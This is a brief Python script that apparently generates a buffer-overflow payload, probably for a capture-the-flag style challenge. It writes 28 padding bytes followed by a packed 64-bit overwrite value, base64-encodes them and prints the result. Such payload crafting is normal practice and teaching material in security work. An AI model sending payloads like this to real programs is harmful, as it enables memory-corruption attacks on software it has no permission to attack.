
import sys
import struct
import base64

buf = b'HHHHHHHHHHHHHHHHHHHHHHHHHHHH'
buf += struct.pack('<Q', 6431464947266643280)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
